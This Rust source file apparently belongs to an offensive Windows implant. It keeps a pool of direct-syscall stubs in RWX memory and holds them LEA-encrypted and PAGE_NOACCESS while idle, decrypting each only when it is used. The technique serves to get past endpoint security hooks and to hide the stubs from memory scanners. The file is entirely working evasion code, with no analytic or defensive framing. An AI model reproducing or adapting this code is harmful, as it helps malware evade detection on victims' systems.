use std::ptr::null_mut;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;

use winapi::shared::minwindef::DWORD;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_NOACCESS, MEM_COMMIT, MEM_RESERVE};

use lazy_static::lazy_static;


use crate::internal::crypto::lea::{lea_encrypt_block, lea_decrypt_block};

pub const STUB_SIZE: usize = 32;

const NUM_STUBS: usize = 32;
const SYSCALL_OFFSET: usize = 4;
const SYSCALL_OPCODE_OFFSET: usize = 8;

#[repr(C)]
pub struct StubSlot {
    pub addr: *mut u8,
    pub active: AtomicBool,
    pub encrypted: AtomicBool,
}

unsafe impl Send for StubSlot {}
unsafe impl Sync for StubSlot {}

pub struct StubPool {
    pub slots: [StubSlot; NUM_STUBS],
}

unsafe impl Send for StubPool {}
unsafe impl Sync for StubPool {}

lazy_static! {
    pub static ref G_STUB_POOL: Mutex<StubPool> = Mutex::new(StubPool::init());
}

impl StubPool {
    pub fn init() -> Self {
        let slots: [StubSlot; NUM_STUBS] = std::array::from_fn(|_| {
            let stub = Self::alloc_stub();
            unsafe {
                Self::write_stub_template(stub);
                lea_encrypt_block(stub, STUB_SIZE);
                VirtualProtect(stub as _, STUB_SIZE, PAGE_NOACCESS, &mut 0);
            }
            StubSlot {
                addr: stub,
                active: AtomicBool::new(false),
                encrypted: AtomicBool::new(true),
            }
        });
        StubPool { slots }
    }

    fn alloc_stub() -> *mut u8 {
        let mem = unsafe {
            VirtualAlloc(null_mut(), STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        } as *mut u8;
        if mem.is_null() {
            panic!("failed to allocate stub");
        }
        mem
    }

    unsafe fn write_stub_template(stub: *mut u8) {
        let tpl: [u8; 11] = [
            0x4C, 0x8B, 0xD1,             // mov r10, rcx
            0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, syscall
            0x0F, 0x05,                   // syscall
            0xC3,                         // ret
        ];
        std::ptr::copy_nonoverlapping(tpl.as_ptr(), stub, tpl.len());
        for i in tpl.len()..STUB_SIZE {
            stub.add(i).write(0xCC);
        }
    }

    pub fn acquire(&mut self) -> Option<*mut u8> {
        for slot in self.slots.iter_mut() {
            if !slot.active.swap(true, Ordering::SeqCst) {
                unsafe {
                    VirtualProtect(slot.addr as _, STUB_SIZE, PAGE_EXECUTE_READWRITE, &mut 0);
                    if slot.encrypted.swap(false, Ordering::SeqCst) {
                        lea_decrypt_block(slot.addr, STUB_SIZE);
                    }
                }
                return Some(slot.addr);
            }
        }
        None
    }

    pub fn release(&mut self, addr: *mut u8) {
        for slot in self.slots.iter_mut() {
            if slot.addr == addr {
                unsafe {
                    lea_encrypt_block(addr, STUB_SIZE);
                    VirtualProtect(addr as _, STUB_SIZE, PAGE_NOACCESS, &mut 0);
                }

                slot.encrypted.store(true, Ordering::SeqCst);
                slot.active.store(false, Ordering::SeqCst);
            }
        }
    }
}